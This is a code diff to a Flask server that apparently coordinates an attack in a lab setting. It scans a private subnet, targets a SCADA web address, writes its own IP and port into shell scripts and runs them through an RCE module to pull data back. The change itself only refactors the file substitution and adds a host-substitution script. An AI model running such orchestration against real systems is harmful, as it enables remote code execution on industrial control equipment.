@@ -2,17 +2,13 @@ from flask import Flask, request, jsonify
 import nmap
 import threading
 from RCE import RCE
-from utils import get_ip_address
+from utils import *
 
 this_ip = get_ip_address('eth0')
 this_port = 80
 
 scada_url='http://172.16.10.100:8080' # get with scan
-
-with open('scripts/fetch_ip_ditto.sh', 'r') as f:
-    data = f.read()
-with open('scripts/fetch_ip_ditto.sh', 'w') as f:
-    f.write(data % (this_ip, this_port))
+substitute_in_file('scripts/fetch_ip_ditto.sh', (this_ip, this_port))
 
 ip_ditto = None
 last_data_ditto = {}
@@ -32,11 +28,9 @@ def get_script(name):
 def route_ip_ditto():
     ip_ditto = str(request.get_data().decode())
     print("IP DITTO FRONTEND: "+ip_ditto, flush=True)
-
-    with open('scripts/fetch_data_ditto.sh', 'r') as f:
-        data = f.read()
-    with open('scripts/fetch_data_ditto.sh', 'w') as f:
-        f.write(data % (ip_ditto, this_ip, this_port))
+    
+    substitute_in_file('scripts/fetch_data_ditto.sh', (ip_ditto, this_ip, this_port))
+    substitute_in_file('scripts/substitute_host.sh', (this_ip,))
 
     return "Stored"
 
@@ -61,7 +55,8 @@ if __name__ == "__main__":
     ### RCE
     rce.execute_script('fetch_ip_ditto.sh')
     rce.execute_script('fetch_data_ditto.sh')
-
+    rce.execute_script('substitute_host.sh')
+    
     # SCAN
     '''
     scanner.scan('172.16.10.99-101')
